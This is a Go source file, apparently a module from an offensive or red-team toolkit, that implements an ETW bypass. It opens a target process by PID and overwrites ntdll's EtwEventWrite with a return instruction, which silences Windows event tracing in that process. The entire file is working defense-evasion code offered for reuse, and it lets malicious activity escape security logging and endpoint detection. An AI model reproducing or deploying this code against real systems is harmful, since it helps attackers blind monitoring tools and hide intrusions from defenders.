package modules

import (
	"errors"
	"fmt"

	"golang.org/x/sys/windows"
)

// ETW bypass by injecting into the provided PID
// and overwriting the NTDLL.EtwEventWrite function
func PatchETW(pid int) error {
	// Payload to inject into the function
	// ret
	// bytes for 64bit process
	newBytes := []byte{0xc3}

	// ret 14
	// bytes for 32bit process
	if IsWOW64Process() {
		newBytes = []byte{0xc2, 0x14, 0x00, 0x00}
	}

	lbytes := uintptr(len(newBytes))

	// Open handle to the process based on the PID
	// HANDLE OpenProcess(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);
	// dwDesiredAccess = PROCESS_VM_OPERATION (0x0008) | PROCESS_VM_WRITE (0x0020)
	// bInheritHandle = False
	// dwProcessId = PID
	procHandle, err := windows.OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_WRITE, false, uint32(pid))

	if err != nil {
		rs := fmt.Sprintf("Error opening process with PID: %d\n", pid)
		return errors.New(rs)
	}

	/// Load ntdll.dll into the process
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	etwEventWrite := ntdll.NewProc("EtwEventWrite")

	// Write the payload
	// BOOL WriteProcessMemory(HANDLE  hProcess, LPVOID  lpBaseAddress, LPCVOID lpBuffer, SIZE_T  nSize, SIZE_T  *lpNumberOfBytesWritten);
	var bytesWritten uintptr
	err = windows.WriteProcessMemory(procHandle, etwEventWrite.Addr(), &newBytes[0], lbytes, &bytesWritten)
	if err != nil {
		rs := fmt.Sprintf("Failed to patch NTDLL.EtwEventWrite in process with PID: %d\n", pid)
		return errors.New(rs)
	}

	// Close the handle
	windows.Close(procHandle)

	return nil
}
